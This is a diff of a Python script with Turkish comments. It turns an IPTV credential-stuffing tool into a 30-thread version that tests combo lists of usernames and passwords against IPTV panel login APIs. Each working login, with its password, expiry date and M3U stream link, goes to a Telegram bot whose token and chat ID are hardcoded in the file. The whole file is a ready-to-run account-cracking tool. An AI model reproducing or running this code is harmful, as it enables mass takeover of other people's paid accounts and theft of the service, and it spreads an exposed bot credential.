@@ -1,23 +1,21 @@
 import os
 import time
-import random
-import threading
+import datetime
 import requests
-from flask import Flask
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
-requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
+# SSL uyarılarını kapat
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
+from flask import Flask
 app = Flask('')
 
 @app.route('/')
 def home():
-    return "IPTV Tarayıcı Aktif!"
+    return "IPTV Bot Aktif ve Hızlı (Multi-Thread) Modda Çalışıyor!"
 
-def run_web():
-    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
-
+# --- TELEGRAM AYARLARI ---
 TOKEN = "9296501081:AAG8COydawvxX-TfAEArbG-SdEtliP6WODM"
 CHAT_ID = "-1003901042500"
 
@@ -25,7 +23,7 @@ def telegrama_gonder(mesaj):
     try:
         url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
         data = {"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "HTML"}
-        requests.post(url, data=data, timeout=5)
+        requests.post(url, data=data, timeout=10)
     except Exception as e:
         print(f"[!] Telegram mesajı gönderilemedi: {e}")
 
@@ -38,35 +36,75 @@ HEADERd = {
     'User-Agent': 'VLC/3.0.18 LibVLC/3.0.18',
 }
 
-def proxy_sec(proxy_listesi):
-    if not proxy_listesi:
-        return None
-    p = random.choice(proxy_listesi).strip()
-    if not p:
-        return None
-    if not p.startswith("http"):
-        p = f"http://{p}"
-    return {"http": p, "https": p}
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
-def m3u_tara(panel, user, pas, proxy_listesi):
+def m3u_tara_detayli(panel, user, pas):
     api_url = f"http://{panel}/player_api.php?username={user}&password={pas}"
-    proxies = proxy_sec(proxy_listesi)
     try:
-        if proxies:
-            res = requests.get(api_url, headers=HEADERd, timeout=3.5, verify=False, proxies=proxies)
-        else:
-            res = requests.get(api_url, headers=HEADERd, timeout=3.5, verify=False)
-            
+        res = requests.get(api_url, headers=HEADERd, timeout=4, verify=False)
         if res.status_code == 200 and 'user_info' in res.text:
-            if '"auth":1' in res.text or '"status":"Active"' in res.text:
+            veri = str(res.text)
+            if '"auth":1' in veri or '"status":"Active"' in veri:
+                print(f"[+] HİT YAKALANDI! Panel: {panel} | User: {user}")
+                
+                try:
+                    status = veri.split('status":')[1].split(',')[0].replace('"', '')
+                except:
+                    status = "Active"
+                
+                try:
+                    acon = veri.split('active_cons":')[1].split(',')[0].replace('"', '')
+                except:
+                    acon = "?"
+                
+                try:
+                    mcon = veri.split('max_connections":')[1].split(',')[0].replace('"', '')
+                except:
+                    mcon = "?"
+                
+                try:
+                    bitis = veri.split('exp_date":')[1].split(',')[0].replace('"', '')
+                    if bitis == 'null' or not bitis.isdigit():
+                        bitis = 'Sınırsız'
+                    else:
+                        bitis = datetime.datetime.fromtimestamp(int(bitis)).strftime('%Y-%m-%d %H:%M:%S')
+                except:
+                    bitis = 'Bilinmiyor'
+
+                try:
+                    realm = veri.split('url":')[1].split(',')[0].replace('"', '')
+                    port = veri.split('port":')[1].split(',')[0].replace('"', '')
+                except:
+                    realm, port = panel, "80"
+
+                kanalsayisi, filmsayisi, dizisayisi = "0", "0", "0"
+                try:
+                    k_res = requests.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_live_streams", timeout=2, verify=False)
+                    kanalsayisi = str(k_res.text.count('stream_id'))
+                    
+                    v_res = requests.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_vod_streams", timeout=2, verify=False)
+                    filmsayisi = str(v_res.text.count('stream_id'))
+                    
+                    s_res = requests.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_series", timeout=2, verify=False)
+                    dizisayisi = str(s_res.text.count('series_id'))
+                except:
+                    pass
+
                 m3ulink = f"http://{panel}/get.php?username={user}&password={pas}&type=m3u_plus"
+                
                 mesaj = (
-                    f"🔥 <b>M3U HİT BULUNDU!</b>\n"
-                    f"🌐 <b>Panel:</b> http://{panel}\n"
-                    f"👤 <b>User:</b> <code>{user}</code>\n"
-                    f"🔑 <b>Pass:</b> <code>{pas}</code>\n"
-                    f"🔗 <b>M3U:</b> {m3ulink}"
+                    f"🟢 <b>IPTV HİT BULUNDU! (Hızlı Tarayıcı)</b>\n"
+                    f"🌐 <b>Ana Host:</b> http://{panel}\n"
+                    f"🔗 <b>Real Host:</b> http://{realm}:{port}\n"
+                    f"👤 <b>Kullanıcı:</b> <code>{user}</code>\n"
+                    f"🔑 <b>Şifre:</b> <code>{pas}</code>\n"
+                    f"📅 <b>Bitiş Tarihi:</b> {bitis}\n"
+                    f"⚡ <b>Aktif/Max Bağlantı:</b> {acon} / {mcon}\n"
+                    f"📊 <b>Durum:</b> {status}\n"
+                    f"🎬 <b>Kanal:</b> {kanalsayisi} | <b>Film:</b> {filmsayisi} | <b>Dizi:</b> {dizisayisi}\n"
+                    f"🔗 <b>M3U Plus Link:</b> {m3ulink}"
                 )
+                
                 telegrama_gonder(mesaj)
                 return True
     except:
@@ -74,61 +112,72 @@ def m3u_tara(panel, user, pas, proxy_listesi):
     return False
 
 def arka_plan_tarayici():
-    # Doğru kullanıcı adın (harman4475) ve repo adın (otonomTARAYICI) ile güncellendi:
-    PANEL_RAW_URL = "https://raw.githubusercontent.com/harman4475/otonomTARAYICI/main/panel_list/benzersiz_paneller.txt"
-    COMBO_RAW_URL = "https://raw.githubusercontent.com/harman4475/otonomTARAYICI/main/combo/userpass.txt"
-    PROXY_RAW_URL = "https://raw.githubusercontent.com/harman4475/otonomTARAYICI/main/proxy/proxy.txt"
+    print("[*] Bulut Otonom Hızlı Tarayıcı Başlatıldı...")
+    time.sleep(2)
+    telegrama_gonder("🚀 <b>Hızlı Multi-Thread Tarayıcı Aktif!</b>\n⚡ Eşzamanlı tarama motoru devreye alındı.")
+    
+    combo_dir = os.path.join(BASE_DIR, 'combo')
+    panel_dir = os.path.join(BASE_DIR, 'panel_list')
     
     while True:
         try:
-            proksiler = []
-            try:
-                r_proxy = requests.get(PROXY_RAW_URL, timeout=5)
-                if r_proxy.status_code == 200:
-                    proksiler = [p.strip() for p in r_proxy.text.splitlines() if p.strip()]
-            except:
-                pass
-
+            # Panelleri yükle
             paneller = []
-            try:
-                r_panel = requests.get(PANEL_RAW_URL, timeout=5)
-                if r_panel.status_code == 200:
-                    paneller = [p.strip().replace('http://', '').replace('https://', '') for p in r_panel.text.splitlines() if p.strip()]
-            except:
-                pass
+            if os.path.exists(panel_dir):
+                for p_dosya in os.listdir(panel_dir):
+                    if p_dosya.endswith('.txt'):
+                        p_yol = os.path.join(panel_dir, p_dosya)
+                        with open(p_yol, 'r', encoding='utf-8', errors='ignore') as pf:
+                            for line in pf:
+                                p_clean = line.strip().replace('http://', '').rstrip('/')
+                                if p_clean:
+                                    paneller.append(p_clean)
 
-            combolar = []
-            try:
-                r_combo = requests.get(COMBO_RAW_URL, timeout=5)
-                if r_combo.status_code == 200:
-                    for satir in r_combo.text.splitlines():
-                        satir = satir.strip()
-                        if ":" in satir:
-                            parca = satir.split(":", 1)
-                            combolar.append((parca[0].strip(), parca[1].strip()))
-            except:
-                pass
+            if not paneller:
+                paneller = ["ornekpanel.com:8080"]
 
-            if not paneller or not combolar:
-                telegrama_gonder(f"⚠️ <b>Bekleniyor:</b> Panel ({len(paneller)}), Combo ({len(combolar)})")
-                time.sleep(60)
-                continue
+            # Comboları tara ve panellerle eşleştir (Eşzamanlı / Multi-Thread)
+            if os.path.exists(combo_dir):
+                for dosya_adi in os.listdir(combo_dir):
+                    if dosya_adi.endswith('.txt'):
+                        dosya_yolu = os.path.join(combo_dir, dosya_adi)
+                        print(f"[i] Taranan combo dosyası: {dosya_adi}")
+                        
+                        combolar = []
+                        with open(dosya_yolu, 'r', encoding='utf-8', errors='ignore') as f:
+                            for line in f:
+                                line = line.strip()
+                                if ':' in line:
+                                    parts = line.split(':', 1)
+                                    user = parts[0].strip()
+                                    pas = parts[1].strip()
+                                    if user and pas:
+                                        combolar.append((user, pas))
 
-            # M3U Tarama Başlat
-            telegrama_gonder(f"⏳ <b>M3U tarama başlatıldı (Panel: {len(paneller)}, Combo: {len(combolar)})</b>")
-            for panel in paneller:
-                for user, pas in combolar:
-                    m3u_tara(panel, user, pas, proksiler)
-                    time.sleep(0.05)
-            telegrama_gonder("✅ <b>M3U tarama bitti</b>")
-
-            time.sleep(300)
-
+                        print(f"[i] Toplam {len(combolar)} hesap, {len(paneller)} panel ile taranıyor...")
+                        
+                        # ThreadPoolExecutor ile 30 iş parçacığı aynı anda çalışır
+                        with ThreadPoolExecutor(max_workers=30) as executor:
+                            futures = []
+                            for user, pas in combolar:
+                                for panel in paneller:
+                                    futures.append(executor.submit(m3u_tara_detayli, panel, user, pas))
+                            
+                            # Görevlerin tamamlanmasını bekle
+                            for future in as_completed(futures):
+                                pass
+        
+            print("[i] Tarama turu tamamlandı, 10 dakika sonra tekrar dönecek...")
+            time.sleep(600)
         except Exception as e:
-            telegrama_gonder(f"❌ <b>Döngü Hatası:</b> {e}")
+            print(f"[!] Tarama döngüsü hatası: {e}")
             time.sleep(30)
 
 if __name__ == '__main__':
-    t = threading.Thread(target=run_web)
+    import threading
+    t = threading.Thread(target=arka_plan_tarayici)
+    t.daemon = True
     t.start()
-    arka_plan_tarayici()
+    
+    print("[*] Flask Web Sunucusu Başlatılıyor...")
+    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
